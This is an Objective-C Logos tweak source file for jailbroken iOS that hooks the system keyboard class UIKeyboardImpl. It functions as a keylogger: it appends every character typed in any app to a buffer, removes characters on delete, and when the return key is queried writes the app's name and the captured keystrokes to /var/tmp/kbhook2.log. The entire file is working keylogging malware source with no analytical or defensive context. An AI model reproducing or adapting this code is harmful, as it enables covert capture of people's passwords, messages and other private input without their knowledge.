#import <UIKit/UIKeyboardImpl.h>

//NSFileManager *fileManager = [NSFileManager defaultManager];
//[fileManager fileExistsAtPath:filePath];
//[fileManager removeItemAtPath:filePath error:NULL];

%hook UIKeyboardImpl
NSMutableString *keyboardInput = [[NSMutableString alloc] init];
NSString *str = [[NSString alloc] init];


-(void)removeFromSuperview{
        NSLog(@"removeFromSuperView");         
        %orig;
}

-(BOOL)returnKeyEnabled{
	if([keyboardInput length]!=0){
		NSString *myBundleName = [[NSString alloc] init];
		myBundleName = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleName"];
		if(myBundleName){
			str = [NSString stringWithFormat:@"Appname: %@. Keystrokes %@\r\n",myBundleName,keyboardInput];			
			NSLog(@"%@",str);

			NSString *logPath = @"/var/tmp/kbhook2.log";
	 		NSFileManager *fileManager = [NSFileManager defaultManager];
    			if (![fileManager fileExistsAtPath:logPath]) {
				NSError *error = nil;
				BOOL success = [str writeToFile:logPath atomically:NO encoding:NSASCIIStringEncoding error:&error];
				if(!success){
					NSLog(@"Write file error:%@",error);
				}	
			}else{
				NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:logPath];
				[fileHandle seekToEndOfFile];
				NSData *textData = [str dataUsingEncoding:NSUTF8StringEncoding];
				[fileHandle writeData:textData];
				[fileHandle closeFile];
			}
			[logPath release];
			[keyboardInput setString:@""];
		}
	}
	return %orig;
}
- (BOOL)callShouldInsertText:(id)arg1{
	[keyboardInput appendString:arg1];
	return %orig;
}

- (void)handleDelete{
	NSString *myBundleName = [[NSString alloc] init];
	myBundleName = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleName"];
	if(myBundleName){
		[keyboardInput deleteCharactersInRange:NSMakeRange([keyboardInput length] -1, 1)];	
	}
	%orig;
}

%end


